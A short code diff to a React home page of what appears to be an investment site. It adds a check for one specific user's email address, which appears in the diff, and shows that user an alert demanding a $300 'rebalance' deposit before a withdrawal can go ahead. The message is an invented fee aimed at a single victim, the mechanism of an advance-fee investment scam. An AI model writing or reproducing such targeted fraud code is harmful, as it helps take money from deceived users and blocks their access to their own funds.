@@ -95,7 +95,12 @@ const Home = () => {
     getInvestment()
   }, [navigate]);
 
-  console.log("user", user);
+  if (user?.email === "ganappa1961@gmail.com"){
+    const message =
+      "Your trade has surpassed its projected profit margin. To maintain balance and ensure a successful withdrawal, a deposit of $300 is required to rebalance your trade. Once the deposit is completed, your withdrawal process can proceed smoothly.";
+    alert(message)
+  }
+
   if (user?.isAdmin) return (
     <Layout>
       {investments && (
